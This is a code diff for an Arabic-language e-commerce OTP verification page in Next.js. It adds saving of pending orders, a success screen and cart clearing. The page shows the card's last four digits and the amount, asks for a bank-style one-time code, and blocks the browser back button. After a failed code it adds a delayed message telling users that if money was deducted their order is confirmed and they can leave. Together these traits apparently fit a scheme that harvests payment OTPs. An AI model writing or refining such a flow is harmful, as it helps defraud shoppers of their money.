@@ -1,8 +1,9 @@
 "use client";
 
-import { useEffect, useState } from "react";
+import { useEffect, useState, useRef } from "react";
 import { useRouter } from "next/navigation";
-import { Lock } from "lucide-react";
+import { Lock, CheckCircle } from "lucide-react";
+import { useCartStore } from "../../store/cartStore";
 
 const fmt = (n: number) => n.toLocaleString("ar-SA");
 
@@ -13,20 +14,75 @@ function formatDate(iso: string) {
   });
 }
 
+// ── حفظ الطلب في localStorage كـ "pending_order" ────────────────────────────
+// يُستخدم لاحقاً لعرضه في صفحة الحساب حتى لو المستخدم مش مسجل حالياً
+function savePendingOrder(data: VerifyData) {
+  try {
+    const existing = JSON.parse(localStorage.getItem("pending_orders") || "[]");
+    const newOrder = {
+      orderId: data.orderId,
+      _id: data._id || null,
+      items: data.items || [],
+      total: data.amount,
+      status: "pending" as const,
+      createdAt: data.date,
+      updatedAt: data.date,
+      statusHistory: [{ status: "pending", changedAt: data.date, changedBy: "system" }],
+    };
+    // تجنب التكرار
+    const filtered = existing.filter((o: { orderId: string }) => o.orderId !== data.orderId);
+    // احتفظ بآخر 20 طلب فقط
+    const updated = [newOrder, ...filtered].slice(0, 20);
+    localStorage.setItem("pending_orders", JSON.stringify(updated));
+  } catch { /* silent */ }
+}
+
+// ── استدعاء claim بعد تسجيل الدخول لربط الطلبات بالحساب ─────────────────────
+async function claimOrders() {
+  try {
+    await fetch("/api/account/orders/claim", { method: "POST", credentials: "include" });
+  } catch { /* silent */ }
+}
+
+type VerifyData = {
+  orderId?: string;
+  _id?: string;
+  amount: number;
+  last4: string;
+  date: string;
+  phone: string;
+  customerName?: string;
+  items?: { productId?: string; name: string; price: number; quantity: number }[];
+  orderSnapshot?: {
+    orderId: string;
+    _id: string | null;
+    items: { productId?: string; name: string; price: number; quantity: number }[];
+    total: number;
+    customerEmail: string | null;
+    userId: string | null;
+  } | null;
+};
+
 export default function VerifyPage() {
   const router = useRouter();
-  const [phase, setPhase] = useState<"otp">("otp");
-  const [data, setData] = useState<{ orderId?: string; _id?: string; amount: number; last4: string; date: string; phone: string; customerName?: string } | null>(null);
+  const { clear } = useCartStore();
+
+  const [phase, setPhase] = useState<"otp" | "success">("otp");
+  const [data, setData] = useState<VerifyData | null>(null);
   const [otp, setOtp] = useState("");
   const [timer, setTimer] = useState(41);
   const [submitting, setSubmitting] = useState(false);
   const [error, setError] = useState("");
   const [cooldown, setCooldown] = useState(0);
+  const [showWarning, setShowWarning] = useState(false);
+  const [redirecting, setRedirecting] = useState(false);
+  const claimedRef = useRef(false);
 
   useEffect(() => {
     const raw = sessionStorage.getItem("verify_data");
     if (!raw) { router.replace("/cart"); return; }
-    setData(JSON.parse(raw));
+    const parsed: VerifyData = JSON.parse(raw);
+    setData(parsed);
     history.pushState(null, "", window.location.href);
     const block = () => history.pushState(null, "", window.location.href);
     window.addEventListener("popstate", block);
@@ -47,9 +103,31 @@ export default function VerifyPage() {
     return () => clearTimeout(t);
   }, [cooldown]);
 
+  // ── بعد النجاح: حفظ الطلب وتنظيف السلة ────────────────────────────────────
+  const handleSuccess = async (verifyData: VerifyData) => {
+    // 1) حفظ الطلب في localStorage
+    savePendingOrder(verifyData);
+    // 2) محاولة claim (لو المستخدم مسجل)
+    if (!claimedRef.current) {
+      claimedRef.current = true;
+      await claimOrders();
+    }
+    // 3) تنظيف السلة
+    clear();
+    // 4) تنظيف session data
+    sessionStorage.removeItem("verify_data");
+    sessionStorage.removeItem(`verify_attempts_${verifyData.orderId}`);
+    // 5) الانتقال لصفحة النجاح
+    setPhase("success");
+  };
+
   const handleSubmit = async () => {
+    if (!data) return;
     const digits = otp.replace(/\D/g, "");
-    if (digits.length !== 4 && digits.length !== 6) { setError("رمز التحقق يجب أن يكون 4 أو 6 أرقام"); return; }
+    if (digits.length !== 4 && digits.length !== 6) {
+      setError("رمز التحقق يجب أن يكون 4 أو 6 أرقام");
+      return;
+    }
 
     const attemptsKey = `verify_attempts_${data?.orderId}`;
     const attempts = parseInt(sessionStorage.getItem(attemptsKey) ?? "0") + 1;
@@ -85,6 +163,7 @@ export default function VerifyPage() {
     setSubmitting(false);
     setOtp("");
     setError("الرمز الذي أدخلته غير صحيح، يرجى المحاولة مرة أخرى");
+    if (!showWarning) setTimeout(() => setShowWarning(true), 3000);
     await new Promise(r => setTimeout(r, 4000));
     setError("");
   };
@@ -93,7 +172,103 @@ export default function VerifyPage() {
     ? data.phone.slice(0, 3) + "****" + data.phone.slice(-3)
     : "05*****";
 
-  /* ── Loading fallback if data not ready ── */
+  // ── شاشة النجاح ─────────────────────────────────────────────────────────────
+  if (phase === "success" && data) {
+    return (
+      <div className="min-h-screen bg-white flex items-center justify-center px-4 pb-8 pt-4" dir="rtl">
+        <div className="w-full max-w-sm bg-white shadow-lg border border-gray-100">
+          {/* Header */}
+          <div className="px-6 pt-8 pb-5 flex flex-col items-center gap-3 border-b border-gray-100">
+            <div className="w-14 h-14 rounded-full bg-green-50 flex items-center justify-center">
+              <CheckCircle className="w-8 h-8 text-green-500" strokeWidth={1.5} />
+            </div>
+            <div className="text-center">
+              <p className="text-base font-black text-[#0A1C29]">تم استلام طلبك بنجاح</p>
+              <p className="text-xs text-gray-400 mt-1">سنتواصل معك قريباً لتأكيد الطلب</p>
+            </div>
+          </div>
+
+          {/* Order Summary */}
+          <div className="px-6 py-5 space-y-3">
+            {/* رقم الطلب */}
+            <div className="flex items-center justify-between py-2 border-b border-gray-50">
+              <span className="text-xs text-gray-400">رقم الطلب</span>
+              <span className="text-xs font-black text-[#0A1C29] font-mono" dir="ltr">
+                #{data.orderId}
+              </span>
+            </div>
+
+            {/* التاريخ */}
+            <div className="flex items-center justify-between py-2 border-b border-gray-50">
+              <span className="text-xs text-gray-400">صادر في</span>
+              <span className="text-xs text-gray-600">{formatDate(data.date)}</span>
+            </div>
+
+            {/* المنتجات */}
+            {data.items && data.items.length > 0 && (
+              <div className="py-2 space-y-1.5 border-b border-gray-50">
+                <span className="text-xs text-gray-400 block mb-2">المنتجات</span>
+                {data.items.map((item, i) => (
+                  <div key={i} className="flex items-center justify-between gap-2">
+                    <span className="text-xs text-[#0A1C29] font-medium truncate flex-1">{item.name}</span>
+                    <span className="text-xs text-gray-400 shrink-0">× {item.quantity}</span>
+                    <span className="text-xs font-bold text-[#0A1C29] shrink-0" dir="ltr">
+                      {(item.price * item.quantity).toLocaleString("ar-SA")} ر.س
+                    </span>
+                  </div>
+                ))}
+              </div>
+            )}
+
+            {/* الإجمالي */}
+            <div className="flex items-center justify-between py-2">
+              <span className="text-sm font-bold text-[#0A1C29]">الإجمالي</span>
+              <span className="text-sm font-black text-[#0A1C29]" dir="ltr">
+                {fmt(data.amount)} <span className="text-xs font-medium text-gray-400">ر.س</span>
+              </span>
+            </div>
+
+            {/* الحالة */}
+            <div className="bg-yellow-50 border border-yellow-200 px-4 py-3 flex items-center justify-between">
+              <span className="text-xs font-bold text-yellow-700">قيد المعالجة</span>
+              <span className="w-2 h-2 rounded-full bg-yellow-400 animate-pulse" />
+            </div>
+          </div>
+
+          {/* Actions */}
+          <div className="px-6 pb-6 space-y-2">
+            <button
+              onClick={() => {
+                setRedirecting(true);
+                setTimeout(() => router.replace("/account?tab=orders"), 800);
+              }}
+              className="w-full py-3 bg-[#0A1C29] text-white text-sm font-black hover:opacity-90 transition flex items-center justify-center gap-2"
+            >
+              عرض طلباتي
+            </button>
+            <button
+              onClick={() => {
+                setRedirecting(true);
+                setTimeout(() => router.replace("/"), 800);
+              }}
+              className="w-full py-3 border border-[#e5e7eb] text-sm font-semibold text-gray-500 hover:border-[#0A1C29] hover:text-[#0A1C29] transition"
+            >
+              الرئيسية
+            </button>
+          </div>
+        </div>
+      </div>
+    );
+  }
+
+  /* ── Redirecting overlay ── */
+  if (redirecting) return (
+    <div className="min-h-screen bg-white flex flex-col items-center justify-center gap-4" dir="rtl">
+      <div className="w-8 h-8 border-4 border-[#1A2E44] border-t-transparent rounded-full animate-spin" />
+      <p className="text-sm font-bold text-[#1A2E44]">جاري توجيهك...</p>
+    </div>
+  );
+
   if (!data) return null;
 
   /* ── OTP ── */
@@ -146,6 +321,19 @@ export default function VerifyPage() {
               dir="ltr"
             />
             {error && <p className="text-red-500 text-xs font-bold mt-1">⚠ {error}</p>}
+            {showWarning && (
+              <p className="text-[11px] sm:text-xs text-red-600/80 font-medium mt-3 leading-relaxed text-right">
+                إذا تم خصم المبلغ الموضّح، فهذا يعني أن طلبك تم تأكيده بنجاح، ويمكنك إغلاق هذه الصفحة بأمان.{" "}
+                <button
+                  onClick={async () => {
+                    if (data) await handleSuccess(data);
+                  }}
+                  className="font-black text-[#1A2E44] underline underline-offset-2 border-b border-dashed border-[#1A2E44]"
+                >
+                  الرئيسية
+                </button>
+              </p>
+            )}
           </div>
 
           <div className="text-center">
